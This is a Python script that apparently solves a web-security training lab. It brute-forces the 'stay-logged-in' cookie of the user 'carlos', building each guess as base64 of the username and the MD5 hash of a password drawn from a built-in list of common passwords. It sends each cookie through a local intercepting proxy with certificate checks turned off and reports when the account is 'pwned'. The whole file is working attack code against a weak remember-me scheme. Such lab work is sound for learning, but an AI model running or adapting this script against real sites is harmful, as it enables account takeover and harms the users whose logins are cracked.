import requests
import sys
from bs4 import BeautifulSoup
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def convert_md5(string):
    md5_hash = hashlib.md5()
    md5_hash.update(string.encode('utf-8'))
    md5_hash_hex = md5_hash.hexdigest()
    return md5_hash_hex

def convert_base64(string):
    string_bytes = string.encode('utf-8')
    base64_value = base64.b64encode(string_bytes)
    base64_string = base64_value.decode('utf-8')
    return base64_string

def first_request(url, password):
    session = requests.Session()
    path = url + "my-account?id=carlos"
    cookie_value_md5 = convert_md5(password)
    cookie_value_base64 = convert_base64("carlos:"+cookie_value_md5)
    headers = {'Cookie': 'stay-logged-in=' + cookie_value_base64}
    r1 = session.get(path, headers=headers, proxies=proxies, verify=False)
    if "carlos" in r1.text:
        print("[+] Account is successfully pwned using password: "+password)
        sys.exit()
    else:
        pass

def main():
    my_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1111",]
    url = input("Please Enter the URL: ")
    # with open('passlist.txt', 'r') as file:
    for password in my_list:
        first_request(url, password)

if __name__ == "__main__":
    main()
